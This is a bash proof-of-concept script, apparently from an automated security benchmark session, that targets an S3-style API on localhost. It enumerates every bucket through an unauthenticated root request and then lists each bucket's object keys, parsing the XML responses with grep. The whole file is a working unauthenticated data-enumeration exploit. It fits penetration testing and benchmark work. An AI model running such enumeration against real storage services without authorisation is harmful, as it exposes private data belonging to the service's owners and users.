#!/bin/bash
# POC: Demonstrates unauthenticated bucket enumeration by accessing the S3 root endpoint to list all buckets, then listing contents of specific buckets without authentication
# Target: ./repo
# Created: 2025-11-07T16:12:30.954Z
# Session: benchmark-XBEN-084-24-mhp1efma

# Proof-of-Concept: Unauthenticated Bucket Enumeration and Listing
# Target: S3 API service
# This POC demonstrates:
# 1. Enumerating all buckets via GET /
# 2. Listing bucket contents via GET /bucketname
# All without authentication

set -e

TARGET_HOST="${TARGET_HOST:-localhost:3000}"
BASE_URL="http://${TARGET_HOST}/s3"

echo "[*] Unauthenticated Bucket Enumeration POC"
echo "[*] Target: $BASE_URL"
echo ""

# Step 1: Enumerate all buckets via root endpoint
echo "[+] Step 1: Enumerating all buckets (GET /)"
echo "[*] Request: GET /"
BUCKET_LIST=$(curl -s "${BASE_URL}/")
echo "[+] Response received (unauthenticated):"
echo "$BUCKET_LIST" | head -20
echo ""

# Extract bucket names from XML response
BUCKET_NAMES=$(echo "$BUCKET_LIST" | grep -oP '(?<=<Name>)[^<]+' | head -5)
echo "[+] Discovered buckets:"
for bucket in $BUCKET_NAMES; do
    echo "    - $bucket"
done
echo ""

# Step 2: List contents of each discovered bucket
echo "[+] Step 2: Listing contents of discovered buckets"
for bucket in $BUCKET_NAMES; do
    echo ""
    echo "[*] Listing contents of bucket: $bucket"
    echo "[*] Request: GET /$bucket"
    BUCKET_CONTENTS=$(curl -s "${BASE_URL}/${bucket}")
    
    if echo "$BUCKET_CONTENTS" | grep -q "<Contents>" || echo "$BUCKET_CONTENTS" | grep -q "<Key>"; then
        echo "[+] Successfully retrieved bucket contents (unauthenticated):"
        # Extract object information
        OBJECTS=$(echo "$BUCKET_CONTENTS" | grep -oP '(?<=<Key>)[^<]+' | head -5)
        SIZES=$(echo "$BUCKET_CONTENTS" | grep -oP '(?<=<Size>)[^<]+' | head -5)
        
        if [ ! -z "$OBJECTS" ]; then
            echo "[+] Objects found in $bucket:"
            echo "$BUCKET_CONTENTS" | grep -A 3 "<Contents>" | head -30
        fi
    else
        echo "[-] Bucket appears empty or error occurred"
    fi
done

echo ""
echo "[+] POC Complete: Successfully enumerated buckets and listed contents without authentication"